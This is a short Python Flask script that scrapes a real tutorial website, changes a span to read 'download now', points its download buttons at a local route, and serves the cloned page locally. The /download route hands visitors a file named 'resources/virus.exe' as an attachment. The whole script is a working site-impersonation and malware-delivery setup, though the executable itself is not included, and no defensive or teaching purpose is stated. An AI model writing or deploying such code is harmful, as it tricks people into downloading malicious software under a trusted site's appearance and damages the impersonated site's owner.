from tkinter import messagebox
from flask import Flask, render_template, send_from_directory, current_app, send_file
import requests
from bs4 import BeautifulSoup

app = Flask(__name__, template_folder='templates')

URL = "https://www.techwithtim.net"
file = r"templates/website.html"

page = requests.get(URL)
soup = BeautifulSoup(page.content, "html.parser")

try:
    btn_start = [soup.find('span', {"id": None})]
    btn_start[-1].replace_with("download now")

    for a in soup.findAll('a', attrs={"class": "ow-icon-placement-right ow-button-hover"}):
        a['href'] = "download"
    with open(file, "wb") as f_output:
        f_output.write(soup.prettify("utf-8"))

except Exception as e:
    with open(file, "wb") as f_output:
        f_output.write(soup.prettify("utf-8"))
    messagebox.showinfo(title="alert", message=e)


if __name__ == "__main__":
    @app.route("/")
    def index():
        return render_template("website.html")
    
    @app.route('/download')
    def download_file():
        path = "resources/virus.exe"
        return send_file(path, as_attachment=True)
    app.run(debug=True)
